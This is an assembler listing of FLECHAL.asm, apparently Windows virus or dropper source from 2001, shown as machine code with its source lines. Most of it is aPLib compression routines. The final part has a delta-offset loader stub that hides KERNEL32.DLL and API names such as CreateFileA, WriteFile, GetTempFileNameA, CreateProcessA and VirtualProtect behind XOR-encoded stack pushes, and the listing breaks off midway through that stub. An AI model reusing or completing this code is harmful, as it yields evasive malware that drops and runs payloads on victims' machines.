1  4726	000024AD  F7 F9			 idiv ecx
1  4727	000024AF  8B 4C	24 0C		 mov ecx, dword	ptr [esp+0Ch]
1  4728	000024B3  8B 5C	24 04		 mov ebx, dword	ptr [esp+04]
1  4729	000024B7  03 C1			 add eax, ecx
1  4730	000024B9  3B C3			 cmp eax, ebx
1  4731	000024BB  E9 FFFFFDF2		 jmp aplib@051	 ;   0.0401FB4
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 84
FLECHAL.asm



1  4732
1  4733	000024C0			 aplib@033:
1  4734
1  4735	000024C0  83 7C	24 2C 00	 cmp dword ptr [esp+2Ch], 00000000
1  4736	000024C5  0F 85	FFFFFEC8	 jne aplib@030
1  4737	000024CB  83 7C	24 04 03	 cmp dword ptr [esp+04], 00000003
1  4738	000024D0  0F 8E	FFFFFEBD	 jle aplib@030
1  4739	000024D6  8B 4C	24 50		 mov ecx, dword	ptr [esp+50h]
1  4740	000024DA  8D 44	24 08		 lea eax, dword	ptr [esp+08]
1  4741	000024DE  8B 15	000AC1D8r	 mov edx, dword	ptr [aplib@003]
1  4742	000024E4  8D 5D	03		 lea ebx, dword	ptr [ebp+03]
1  4743	000024E7  83 C2	03		 add edx, 00000003
1  4744	000024EA  2B CB			 sub ecx, ebx
1  4745	000024EC  E8 FFFFF7A3		 call aplib@023
1  4746	000024F1  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4747	000024F5  3B 04	24		 cmp eax, dword	ptr [esp]
1  4748	000024F8  0F 8C	0000007E	 jl aplib@052	;   0.040227E
1  4749	000024FE  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4750	00002502  8B 04	24		 mov eax, dword	ptr [esp]
1  4751	00002505  E8 FFFFF21E		 call aplib@025
1  4752	0000250A  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4753	0000250E  8B C8			 mov ecx, eax
1  4754	00002510  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4755	00002514  E8 FFFFF20F		 call aplib@025
1  4756
1  4757	00002519  8B D1			 mov edx, ecx
1  4758	0000251B  2B D0			 sub edx, eax
1  4759	0000251D  8B C2			 mov eax, edx
1  4760	0000251F  C1 FA	1F		 sar edx, 1Fh
1  4761	00002522  C1 E2	02		 shl edx, 02
1  4762	00002525  1B C2			 sbb eax, edx
1  4763	00002527  C1 F8	02		 sar eax, 02
1  4764	0000252A  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4765	0000252E  8B 4C	24 04		 mov ecx, dword	ptr [esp+04]
1  4766	00002532  03 C2			 add eax, edx
1  4767	00002534  3B C1			 cmp eax, ecx
1  4768
1  4769	00002536			 aplib@054:
1  4770
1  4771	00002536  7E 08			 jle aplib@053	 ;   0.0402242
1  4772	00002538  C7 44	24 2C 00000001	 mov dword ptr [esp+2Ch], 00000001
1  4773
1  4774	00002540			 aplib@053:
1  4775
1  4776	00002540  85 F6			 test esi, esi
1  4777	00002542  0F 86	FFFFFE4B	 jbe aplib@030
1  4778	00002548  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  4779	0000254C  3B 44	24 04		 cmp eax, dword	ptr [esp+04]
1  4780	00002550  0F 8C	FFFFFE3D	 jl aplib@030
1  4781	00002556  8B D0			 mov edx, eax
1  4782	00002558  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4783	0000255C  E8 FFFFF1C7		 call aplib@025
1  4784	00002561  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4785	00002565  8B C8			 mov ecx, eax
1  4786	00002567  8B 04	24		 mov eax, dword	ptr [esp]
1  4787	0000256A  E8 FFFFF1B9		 call aplib@025
1  4788	0000256F  3B C8			 cmp ecx, eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 85
FLECHAL.asm



1  4789	00002571  0F 8D	FFFFFE1C	 jnl aplib@030
1  4790	00002577  E9 FFFFFD77		 jmp aplib@040
1  4791
1  4792	0000257C			 aplib@052:
1  4793
1  4794	0000257C  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4795	00002580  8B 04	24		 mov eax, dword	ptr [esp]
1  4796	00002583  E8 FFFFF1A0		 call aplib@025
1  4797	00002588  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4798	0000258C  8B C8			 mov ecx, eax
1  4799	0000258E  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4800	00002592  E8 FFFFF191		 call aplib@025
1  4801	00002597  8B D1			 mov edx, ecx
1  4802	00002599  2B D0			 sub edx, eax
1  4803	0000259B  03 D2			 add edx, edx
1  4804	0000259D  B9 0000000B		 mov ecx, 0000000Bh
1  4805	000025A2  8B C2			 mov eax, edx
1  4806	000025A4  C1 FA	1F		 sar edx, 1Fh
1  4807	000025A7  F7 F9			 idiv ecx
1  4808	000025A9  8B 4C	24 0C		 mov ecx, dword	ptr [esp+0Ch]
1  4809	000025AD  8B 5C	24 04		 mov ebx, dword	ptr [esp+04]
1  4810	000025B1  03 C1			 add eax, ecx
1  4811	000025B3  3B C3			 cmp eax, ebx
1  4812	000025B5  E9 FFFFFF7C		 jmp aplib@054	 ;   0.0402238
1  4813
1  4814	000025BA			 aplib@045:
1  4815
1  4816	000025BA  8B 04	24		 mov eax, dword	ptr [esp]
1  4817	000025BD  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  4818	000025C3  75 40			 jne aplib@055	 ;   0.0402307
1  4819	000025C5  8B DE			 mov ebx, esi
1  4820	000025C7  8B D5			 mov edx, ebp
1  4821	000025C9  8B C7			 mov eax, edi
1  4822	000025CB  E8 FFFFEE85		 call aplib@029
1  4823	000025D0  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4824	000025D4  8B C8			 mov ecx, eax
1  4825	000025D6  8B 04	24		 mov eax, dword	ptr [esp]
1  4826	000025D9  E8 FFFFF14A		 call aplib@025
1  4827	000025DE  8B D6			 mov edx, esi
1  4828	000025E0  8D 1C	01		 lea ebx, dword	ptr [ecx+eax]
1  4829	000025E3  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4830	000025E7  E8 FFFFF13C		 call aplib@025
1  4831	000025EC  8B C8			 mov ecx, eax
1  4832	000025EE  8B 04	24		 mov eax, dword	ptr [esp]
1  4833	000025F1  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4834	000025F5  40			 inc eax
1  4835	000025F6  E8 FFFFF12D		 call aplib@025
1  4836	000025FB  03 C1			 add eax, ecx
1  4837	000025FD  3B D8			 cmp ebx, eax
1  4838	000025FF  0F 8E	FFFFFE1D	 jle aplib@047
1  4839
1  4840	00002605			 aplib@055:
1  4841
1  4842	00002605  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4843	00002609  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  4844	0000260F  74 23			 je aplib@056	;   0.0402336
1  4845	00002611  3D 00000500		 cmp eax, 00000500h
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 86
FLECHAL.asm



1  4846	00002616  7C 09			 jl aplib@057	;   0.0402323
1  4847	00002618  83 FE	02		 cmp esi, 00000002
1  4848	0000261B  0F 84	FFFFFE01	 je aplib@047
1  4849
1  4850	00002621			 aplib@057:
1  4851
1  4852	00002621  81 7C	24 30 00007D00	 cmp dword ptr [esp+30h], 00007D00h
1  4853	00002629  7C 09			 jl aplib@056
1  4854	0000262B  83 FE	03		 cmp esi, 00000003
1  4855	0000262E  0F 84	FFFFFDEE	 je aplib@047
1  4856
1  4857	00002634			 aplib@056:
1  4858
1  4859	00002634  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4860	00002638  8B D6			 mov edx, esi
1  4861	0000263A  E8 FFFFF367		 call aplib@058	  ;   0.0401689
1  4862
1  4863	0000263F			 aplib@063:
1  4864
1  4865	0000263F  33 F6			 xor esi, esi
1  4866
1  4867	00002641			 aplib@041:
1  4868
1  4869	00002641  8B 44	24 04		 mov eax, dword	ptr [esp+04]
1  4870	00002645  83 F8	03		 cmp eax, 00000003
1  4871	00002648  7F 71			 jg aplib@059	;   0.04023C1
1  4872	0000264A  8B D0			 mov edx, eax
1  4873	0000264C  8B 04	24		 mov eax, dword	ptr [esp]
1  4874	0000264F  E8 FFFFF0D4		 call aplib@025
1  4875	00002654  8B 5C	24 04		 mov ebx, dword	ptr [esp+04]
1  4876	00002658  8B C8			 mov ecx, eax
1  4877	0000265A  8B D5			 mov edx, ebp
1  4878	0000265C  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4879	00002661  E8 FFFFEDEF		 call aplib@029
1  4880	00002666  3B C8			 cmp ecx, eax
1  4881	00002668  7E 2F			 jle aplib@060	 ;   0.040239F
1  4882
1  4883	0000266A			 aplib@065:
1  4884
1  4885	0000266A  8B 4C	24 04		 mov ecx, dword	ptr [esp+04]
1  4886
1  4887	0000266E			 aplib@062:
1  4888
1  4889	0000266E  85 C9			 test ecx, ecx
1  4890	00002670  74 66			 je aplib@061	;   0.04023DE
1  4891	00002672  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4892	00002677  8B D5			 mov edx, ebp
1  4893	00002679  E8 FFFFEE33		 call aplib@046
1  4894	0000267E  8B 1D	000AC1D8r	 mov ebx, dword	ptr [aplib@003]
1  4895	00002684  43			 inc ebx
1  4896	00002685  49			 dec ecx
1  4897	00002686  89 1D	000AC1D8r	 mov dword ptr [aplib@003], ebx
1  4898	0000268C  EB E0			 jmp aplib@062	 ;   0.0402374
1  4899
1  4900	0000268E			 aplib@042:
1  4901
1  4902	0000268E  8B D5			 mov edx, ebp
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 87
FLECHAL.asm



1  4903	00002690  8B C7			 mov eax, edi
1  4904	00002692  E8 FFFFEE1A		 call aplib@046
1  4905	00002697  EB A6			 jmp aplib@063	 ;   0.0402341
1  4906
1  4907	00002699			 aplib@060:
1  4908
1  4909	00002699  8B 04	24		 mov eax, dword	ptr [esp]
1  4910	0000269C  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  4911	000026A2  74 17			 je aplib@059
1  4912	000026A4  3D 00000500		 cmp eax, 00000500h
1  4913	000026A9  7C 07			 jl aplib@064	;   0.04023B8
1  4914	000026AB  83 7C	24 04 02	 cmp dword ptr [esp+04], 00000002
1  4915	000026B0  74 B8			 je aplib@065	;   0.0402370
1  4916
1  4917	000026B2			 aplib@064:
1  4918
1  4919	000026B2  81 3C	24 00007D00	 cmp dword ptr [esp], 00007D00h
1  4920	000026B9  7D AF			 jge aplib@065
1  4921
1  4922	000026BB			 aplib@059:
1  4923
1  4924	000026BB  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4925	000026BF  8B 04	24		 mov eax, dword	ptr [esp]
1  4926	000026C2  E8 FFFFF2DF		 call aplib@058
1  4927	000026C7  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4928	000026CB  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4929	000026D0  03 D0			 add edx, eax
1  4930	000026D2  89 15	000AC1D8r	 mov dword ptr [aplib@003], edx
1  4931
1  4932	000026D8			 aplib@061:
1  4933
1  4934	000026D8  03 6C	24 04		 add ebp, dword	ptr [esp+04]
1  4935	000026DC  4D			 dec ebp
1  4936	000026DD  E9 FFFFFC38		 jmp aplib@066	 ;   0.040201C
1  4937
1  4938	000026E2			 aplib@021:
1  4939
1  4940	000026E2  85 F6			 test esi, esi
1  4941	000026E4  74 0C			 je aplib@067	;   0.04023F8
1  4942	000026E6  46			 inc esi
1  4943
1  4944	000026E7			 aplib@068:
1  4945
1  4946	000026E7  FF 05	000AC1D8r	 inc dword ptr [aplib@003]
1  4947	000026ED  E9 FFFFFC28		 jmp aplib@066
1  4948
1  4949	000026F2			 aplib@067:
1  4950
1  4951	000026F2  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4952	000026F7  8B D5			 mov edx, ebp
1  4953	000026F9  E8 FFFFEDB3		 call aplib@046
1  4954	000026FE  EB E7			 jmp aplib@068	 ;   0.04023ED
1  4955
1  4956	00002700			 aplib@035:
1  4957
1  4958	00002700  8B 44	24 28		 mov eax, dword	ptr [esp+28h]
1  4959	00002704  3B F0			 cmp esi, eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 88
FLECHAL.asm



1  4960	00002706  0F 85	FFFFFC16	 jne aplib@069	 ;   0.0402024
1  4961	0000270C  8B CD			 mov ecx, ebp
1  4962	0000270E  2B C8			 sub ecx, eax
1  4963	00002710  8B 44	24 50		 mov eax, dword	ptr [esp+50h]
1  4964	00002714  2B C1			 sub eax, ecx
1  4965	00002716  8B C8			 mov ecx, eax
1  4966	00002718  3B C6			 cmp eax, esi
1  4967	0000271A  76 02			 jbe aplib@070	 ;   0.0402424
1  4968	0000271C  8B CE			 mov ecx, esi
1  4969
1  4970	0000271E			 aplib@070:
1  4971
1  4972	0000271E  8D 44	24 08		 lea eax, dword	ptr [esp+08]
1  4973	00002722  8B DD			 mov ebx, ebp
1  4974	00002724  8B D7			 mov edx, edi
1  4975	00002726  2B DE			 sub ebx, esi
1  4976	00002728  E8 FFFFF567		 call aplib@023
1  4977	0000272D  3B 74	24 0C		 cmp esi, dword	ptr [esp+0Ch]
1  4978	00002731  77 2C			 ja aplib@071	;   0.0402465
1  4979	00002733  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4980	00002737  8B D6			 mov edx, esi
1  4981	00002739  E8 FFFFEFEA		 call aplib@025
1  4982	0000273E  8B C8			 mov ecx, eax
1  4983	00002740  8B D6			 mov edx, esi
1  4984	00002742  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4985	00002746  E8 FFFFEFDD		 call aplib@025
1  4986	0000274B  3B C8			 cmp ecx, eax
1  4987	0000274D  7E 10			 jle aplib@071
1  4988	0000274F  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4989	00002753  89 44	24 30		 mov dword ptr [esp+30h], eax
1  4990	00002757  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  4991	0000275B  89 44	24 28		 mov dword ptr [esp+28h], eax
1  4992
1  4993	0000275F			 aplib@071:
1  4994
1  4995	0000275F  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4996	00002763  8B D6			 mov edx, esi
1  4997	00002765  E8 FFFFEFBE		 call aplib@025
1  4998	0000276A  8B DE			 mov ebx, esi
1  4999	0000276C  8B C8			 mov ecx, eax
1  5000	0000276E  8B D5			 mov edx, ebp
1  5001	00002770  8B C7			 mov eax, edi
1  5002	00002772  E8 FFFFECDE		 call aplib@029
1  5003	00002777  3B C8			 cmp ecx, eax
1  5004	00002779  7C 13			 jl aplib@072	;   0.0402494
1  5005
1  5006	0000277B			 aplib@073:
1  5007
1  5008	0000277B  8B D5			 mov edx, ebp
1  5009	0000277D  8B C7			 mov eax, edi
1  5010	0000277F  E8 FFFFED2D		 call aplib@046
1  5011	00002784  47			 inc edi
1  5012	00002785  4E			 dec esi
1  5013	00002786  0F 84	FFFFFB96	 je aplib@069
1  5014	0000278C  EB ED			 jmp aplib@073	 ;   0.0402481
1  5015
1  5016	0000278E			 aplib@072:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 89
FLECHAL.asm



1  5017
1  5018	0000278E  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  5019	00002792  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  5020	00002798  74 1B			 je aplib@074	;   0.04024BB
1  5021	0000279A  3D 00000500		 cmp eax, 00000500h
1  5022	0000279F  7C 05			 jl aplib@075	;   0.04024AC
1  5023	000027A1  83 FE	02		 cmp esi, 00000002
1  5024	000027A4  74 D5			 je aplib@073
1  5025
1  5026	000027A6			 aplib@075:
1  5027
1  5028	000027A6  81 7C	24 30 00007D00	 cmp dword ptr [esp+30h], 00007D00h
1  5029	000027AE  7C 05			 jl aplib@074
1  5030	000027B0  83 FE	03		 cmp esi, 00000003
1  5031	000027B3  74 C6			 je aplib@073
1  5032
1  5033	000027B5			 aplib@074:
1  5034
1  5035	000027B5  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  5036	000027B9  8B D6			 mov edx, esi
1  5037	000027BB  E8 FFFFF1E6		 call aplib@058
1  5038	000027C0  33 F6			 xor esi, esi
1  5039	000027C2  E9 FFFFFB5B		 jmp aplib@069
1  5040
1  5041	000027C7			 aplib@018:
1  5042
1  5043	000027C7  85 F6			 test esi, esi
1  5044	000027C9  74 6A			 je aplib@076	;   0.040253F
1  5045	000027CB  83 FE	01		 cmp esi, 00000001
1  5046	000027CE  0F 86	00000084	 jbe aplib@077	 ;   0.0402562
1  5047	000027D4  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  5048	000027D8  8B D6			 mov edx, esi
1  5049	000027DA  E8 FFFFEF49		 call aplib@025
1  5050	000027DF  8B DE			 mov ebx, esi
1  5051	000027E1  8B C8			 mov ecx, eax
1  5052	000027E3  8B D5			 mov edx, ebp
1  5053	000027E5  8B C7			 mov eax, edi
1  5054	000027E7  E8 FFFFEC69		 call aplib@029
1  5055	000027EC  3B C8			 cmp ecx, eax
1  5056	000027EE  7E 13			 jle aplib@078	 ;   0.040250D
1  5057
1  5058	000027F0			 aplib@082:
1  5059
1  5060	000027F0  33 DB			 xor ebx, ebx
1  5061
1  5062	000027F2			 aplib@079:
1  5063
1  5064	000027F2  3B DE			 cmp ebx, esi
1  5065	000027F4  73 3F			 jnb aplib@076
1  5066	000027F6  8B D5			 mov edx, ebp
1  5067	000027F8  8B C7			 mov eax, edi
1  5068	000027FA  E8 FFFFECB2		 call aplib@046
1  5069	000027FF  43			 inc ebx
1  5070	00002800  47			 inc edi
1  5071	00002801  EB EF			 jmp aplib@079	 ;   0.04024FC
1  5072
1  5073	00002803			 aplib@078:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 90
FLECHAL.asm



1  5074
1  5075	00002803  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  5076	00002807  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  5077	0000280D  74 1B			 je aplib@080	;   0.0402534
1  5078	0000280F  3D 00000500		 cmp eax, 00000500h
1  5079	00002814  7C 05			 jl aplib@081	;   0.0402525
1  5080	00002816  83 FE	02		 cmp esi, 00000002
1  5081	00002819  74 D5			 je aplib@082	;   0.04024FA
1  5082
1  5083	0000281B			 aplib@081:
1  5084
1  5085	0000281B  81 7C	24 30 00007D00	 cmp dword ptr [esp+30h], 00007D00h
1  5086	00002823  7C 05			 jl aplib@080
1  5087	00002825  83 FE	03		 cmp esi, 00000003
1  5088	00002828  74 C6			 je aplib@082
1  5089
1  5090	0000282A			 aplib@080:
1  5091
1  5092	0000282A  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  5093	0000282E  8B D6			 mov edx, esi
1  5094	00002830  E8 FFFFF171		 call aplib@058
1  5095
1  5096	00002835			 aplib@076:
1  5097
1  5098	00002835  83 7C	24 24 00	 cmp dword ptr [esp+24h], 00000000
1  5099	0000283A  74 27			 je aplib@083	;   0.040256D
1  5100
1  5101	0000283C			 aplib@089:
1  5102
1  5103	0000283C  83 7C	24 58 00	 cmp dword ptr [esp+58h], 00000000
1  5104	00002841  0F 85	000000F8	 jne aplib@084	 ;   0.0402649
1  5105
1  5106	00002847			 aplib@093:
1  5107
1  5108	00002847  8B 5C	24 4C		 mov ebx, dword	ptr [esp+4Ch]
1  5109	0000284B  8B 0D	000AC1D4r	 mov ecx, dword	ptr [aplib@004]
1  5110	00002851  2B CB			 sub ecx, ebx
1  5111	00002853  E9 00000110		 jmp aplib@002
1  5112
1  5113	00002858			 aplib@077:
1  5114
1  5115	00002858  8B D5			 mov edx, ebp
1  5116	0000285A  8B C7			 mov eax, edi
1  5117	0000285C  E8 FFFFEC50		 call aplib@046
1  5118	00002861  EB D2			 jmp aplib@076
1  5119
1  5120	00002863			 aplib@083:
1  5121
1  5122	00002863  8B 1D	000AC1E0r	 mov ebx, dword	ptr [aplib@015]
1  5123	00002869  4B			 dec ebx
1  5124	0000286A  89 1D	000AC1E0r	 mov dword ptr [aplib@015], ebx
1  5125	00002870  83 FB	FF		 cmp ebx, 0FFFFFFFFh
1  5126	00002873  74 6A			 je aplib@085	;   0.04025E9
1  5127
1  5128	00002875			 aplib@090:
1  5129
1  5130	00002875  A1 000AC1DCr		 mov eax, dword	ptr [aplib@086]	  ;   0.0403518
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 91
FLECHAL.asm



1  5131	0000287A  8A 10			 mov dl, byte ptr [eax]
1  5132	0000287C  8B 2D	000AC1E0r	 mov ebp, dword	ptr [aplib@015]
1  5133	00002882  02 D2			 add dl, dl
1  5134	00002884  4D			 dec ebp
1  5135	00002885  FE C2			 inc dl
1  5136	00002887  89 2D	000AC1E0r	 mov dword ptr [aplib@015], ebp
1  5137	0000288D  88 10			 mov byte ptr [eax], dl
1  5138	0000288F  83 FD	FF		 cmp ebp, 0FFFFFFFFh
1  5139	00002892  74 6B			 je aplib@087	;   0.0402609
1  5140
1  5141	00002894			 aplib@091:
1  5142
1  5143	00002894  A1 000AC1DCr		 mov eax, dword	ptr [aplib@086]
1  5144	00002899  8A 10			 mov dl, byte ptr [eax]
1  5145	0000289B  8B 0D	000AC1E0r	 mov ecx, dword	ptr [aplib@015]
1  5146	000028A1  02 D2			 add dl, dl
1  5147	000028A3  49			 dec ecx
1  5148	000028A4  FE C2			 inc dl
1  5149	000028A6  89 0D	000AC1E0r	 mov dword ptr [aplib@015], ecx
1  5150	000028AC  88 10			 mov byte ptr [eax], dl
1  5151	000028AE  83 F9	FF		 cmp ecx, 0FFFFFFFFh
1  5152	000028B1  74 6C			 je aplib@088	;   0.0402629
1  5153
1  5154	000028B3			 aplib@092:
1  5155
1  5156	000028B3  A1 000AC1DCr		 mov eax, dword	ptr [aplib@086]
1  5157	000028B8  8A 10			 mov dl, byte ptr [eax]
1  5158	000028BA  02 D2			 add dl, dl
1  5159	000028BC  88 10			 mov byte ptr [eax], dl
1  5160	000028BE  8B 15	000AC1D4r	 mov edx, dword	ptr [aplib@004]
1  5161	000028C4  C6 02	00		 mov byte ptr [edx], 00
1  5162	000028C7  8A 0D	000AC1E0r	 mov cl, byte ptr [aplib@015]
1  5163	000028CD  8A 18			 mov bl, byte ptr [eax]
1  5164	000028CF  42			 inc edx
1  5165	000028D0  D2 E3			 shl bl, cl
1  5166	000028D2  89 15	000AC1D4r	 mov dword ptr [aplib@004], edx
1  5167	000028D8  88 18			 mov byte ptr [eax], bl
1  5168	000028DA  E9 FFFFFF5D		 jmp aplib@089	 ;   0.0402546
1  5169
1  5170	000028DF			 aplib@085:
1  5171
1  5172	000028DF  A1 000AC1D4r		 mov eax, dword	ptr [aplib@004]
1  5173	000028E4  BF 00000007		 mov edi, 00000007
1  5174	000028E9  A3 000AC1DCr		 mov dword ptr [aplib@086], eax
1  5175	000028EE  40			 inc eax
1  5176	000028EF  89 3D	000AC1E0r	 mov dword ptr [aplib@015], edi
1  5177	000028F5  A3 000AC1D4r		 mov dword ptr [aplib@004], eax
1  5178	000028FA  E9 FFFFFF76		 jmp aplib@090	 ;   0.040257F
1  5179
1  5180	000028FF			 aplib@087:
1  5181
1  5182	000028FF  A1 000AC1D4r		 mov eax, dword	ptr [aplib@004]
1  5183	00002904  BA 00000007		 mov edx, 00000007
1  5184	00002909  A3 000AC1DCr		 mov dword ptr [aplib@086], eax
1  5185	0000290E  40			 inc eax
1  5186	0000290F  89 15	000AC1E0r	 mov dword ptr [aplib@015], edx
1  5187	00002915  A3 000AC1D4r		 mov dword ptr [aplib@004], eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 92
FLECHAL.asm



1  5188	0000291A  E9 FFFFFF75		 jmp aplib@091	 ;   0.040259E
1  5189
1  5190	0000291F			 aplib@088:
1  5191
1  5192	0000291F  A1 000AC1D4r		 mov eax, dword	ptr [aplib@004]
1  5193	00002924  BE 00000007		 mov esi, 00000007
1  5194	00002929  A3 000AC1DCr		 mov dword ptr [aplib@086], eax
1  5195	0000292E  40			 inc eax
1  5196	0000292F  89 35	000AC1E0r	 mov dword ptr [aplib@015], esi
1  5197	00002935  A3 000AC1D4r		 mov dword ptr [aplib@004], eax
1  5198	0000293A  E9 FFFFFF74		 jmp aplib@092	 ;   0.04025BD
1  5199
1  5200	0000293F			 aplib@084:
1  5201
1  5202	0000293F  8B 6C	24 4C		 mov ebp, dword	ptr [esp+4Ch]
1  5203	00002943  A1 000AC1D4r		 mov eax, dword	ptr [aplib@004]
1  5204	00002948  2B C5			 sub eax, ebp
1  5205	0000294A  8B 54	24 48		 mov edx, dword	ptr [esp+48h]
1  5206	0000294E  50			 push eax
1  5207	0000294F  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  5208	00002954  2B C2			 sub eax, edx
1  5209	00002956  50			 push eax
1  5210	00002957  FF 54	24 60		 call [esp+60h]
1  5211	0000295B  83 C4	08		 add esp, 00000008
1  5212	0000295E  85 C0			 test eax, eax
1  5213	00002960  0F 85	FFFFFEE1	 jne aplib@093	 ;   0.0402551
1  5214
1  5215	00002966			 aplib@001:
1  5216
1  5217	00002966  33 C9			 xor ecx, ecx
1  5218
1  5219	00002968			 aplib@002:
1  5220
1  5221	00002968  8B C1			 mov eax, ecx
1  5222	0000296A  83 C4	34		 add esp, 34h
1  5223	0000296D  5D			 pop ebp
1  5224	0000296E  5F			 pop edi
1  5225	0000296F  5E			 pop esi
1  5226	00002970  5B			 pop ebx
1  5227	00002971  C2 0014		 ret 0014h
1  5228
   5229
   5230	00002974			    rnd_ini:
   5231
   5232					    callx GetTickCount
1  5233	00002974  E8 00000000e		    call GetTickCount
   5234	00002979  8B C8			    mov	ecx, eax
   5235
   5236	0000297B			    rnd_ini_loop_1:
   5237
   5238	0000297B  E8 0000000A		    call rnd_eax
   5239	00002980  E2 F9			    loop rnd_ini_loop_1
   5240	00002982  83 E0	01		    and	eax, 1
   5241	00002985  85 C0			    test eax, eax
   5242	00002987  75 EB			    jnz	rnd_ini
   5243	00002989  C3			    ret
   5244
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 93
FLECHAL.asm



   5245	0000298A			    rnd_eax:
   5246
   5247	0000298A  51			    push ecx
   5248	0000298B  52			    push edx
   5249	0000298C  B8 2DF5A7EC		    mov	eax, 2df5a7ech
   5250		  =FLAT:298D		    seed equ dword ptr $-4
   5251	00002991  B9 41C64E6D		    mov	ecx,41C64E6Dh
   5252	00002996  F7 E1			    mul	ecx
   5253	00002998  05 00003039		    add	eax,00003039h
   5254	0000299D  25 7FFFFFFF		    and	eax,7FFFFFFFh
   5255	000029A2  A3 0000298Dr		    mov	seed, eax
   5256	000029A7  5A			    pop	edx
   5257	000029A8  59			    pop	ecx
   5258	000029A9  C3			    ret
   5259
   5260	000029AA  01*(87 DB)		    align 4
   5261
   5262	000029AC			    l_start  label
   5263
   5264					    ;  only if loader mode is =	0
   5265
   5266	000029AC  9C			    pushf
   5267	000029AD  60			    pushad
   5268
   5269	000029AE			    l_start_1	label
   5270
   5271	000029AE  E8 0000024A		    call delta
   5272
   5273					    x_push eax,	KERNEL32.DLL~
1  5274								 x_push_first eax
2  5275	000029B3  33 C0						 xor	 eax, eax
3  5276									 x_push_next q,eax,j
4  5277	000029B5  2D 87868600					 sub	 eax, _reg - j
4  5278	000029BA  50						 push	 eax
3  5279									 x_push_next q,eax,j
4  5280	000029BB  35 34353E2E					 xor	 eax, _reg xor j
4  5281	000029C0  50						 push	 eax
3  5282									 x_push_next q,eax,j
4  5283	000029C1  05 E5E70817					 add	 eax, j	- _reg
4  5284	000029C6  50						 push	 eax
3  5285									 x_push_next q,eax,j
4  5286	000029C7  35 7C61090E					 xor	 eax, _reg xor j
4  5287	000029CC  50						 push	 eax
1  5288	000029CD  8B C4						 mov eax, esp
   5289	000029CF  50			    push eax
   5290	000029D0  FF 15	000029ACr	    call dword ptr [l_start]
   5291		  =FLAT:29D2		    _import_GetKernel equ dword	ptr $-4
   5292					    x_pop
1  5293	000029D6  8D 64	24 10					 lea	 esp, [esp + _xsize]
   5294	000029DA  8B D8			    mov	ebx, eax
   5295
   5296					    x_push esi,										    +
   5297					 CreateFileA~WriteFile~CloseHandle~VirtualProtect~OpenMutexA~GetTempPathA~GetTempFileNameA~Cr
   5298					 eateProcessA~GetStartupInfoA~GlobalAlloc~GlobalFree~
1  5299								 x_push_first esi
2  5300	000029DC  33 F6						 xor	 esi, esi
3  5301									 x_push_next q,esi,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 94
FLECHAL.asm



4  5302	000029DE  81 EE	FF9A9A8E				 sub	 esi, _reg - j
4  5303	000029E4  56						 push	 esi
3  5304									 x_push_next q,esi,j
4  5305	000029E5  81 F6	46090410				 xor	 esi, _reg xor j
4  5306	000029EB  56						 push	 esi
3  5307									 x_push_next q,esi,j
4  5308	000029EC  81 C6	28FFE59E				 add	 esi, j	- _reg
4  5309	000029F2  56						 push	 esi
3  5310									 x_push_next q,esi,j
4  5311	000029F3  81 F6	0C032B6C				 xor	 esi, _reg xor j
4  5312	000029F9  56						 push	 esi
3  5313									 x_push_next q,esi,j
4  5314	000029FA  81 EE	22030B0A				 sub	 esi, _reg - j
4  5315	00002A00  56						 push	 esi
3  5316									 x_push_next q,esi,j
4  5317	00002A01  81 F6	2E002662				 xor	 esi, _reg xor j
4  5318	00002A07  56						 push	 esi
3  5319									 x_push_next q,esi,j
4  5320	00002A08  81 C6	D2031F6E				 add	 esi, j	- _reg
4  5321	00002A0E  56						 push	 esi
3  5322									 x_push_next q,esi,j
